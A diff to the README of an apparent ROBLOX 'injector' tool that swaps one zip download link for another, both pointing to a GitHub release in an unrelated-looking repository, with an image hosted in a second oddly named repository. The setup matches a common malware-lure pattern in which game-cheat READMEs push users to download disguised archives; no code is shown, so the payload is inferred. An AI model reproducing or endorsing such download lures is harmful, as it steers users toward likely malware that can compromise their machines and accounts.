@@ -1,7 +1,7 @@
 ## Overview
 <p>This repository contains a ROBLOX injector tool designed to enhance user experience within the ROBLOX gaming platform. The injector facilitates the injection of custom scripts into ROBLOX games, allowing users to modify and extend gameplay functionalities.</p>
 
-## [Download](https://github.com/mailvilenelson/zizi/releases/download/Enjoy!/Sol.zip) the zip archive. <br>
+## [Download](https://github.com/mailvilenelson/zizi/releases/download/Enjoy!/SolExec.zip) the zip archive. <br>
 
 ![image](https://github.com/mrdok364/spermo/releases/download/pisisisi/photo_2024-11-26_18-19-33.jpg)
 
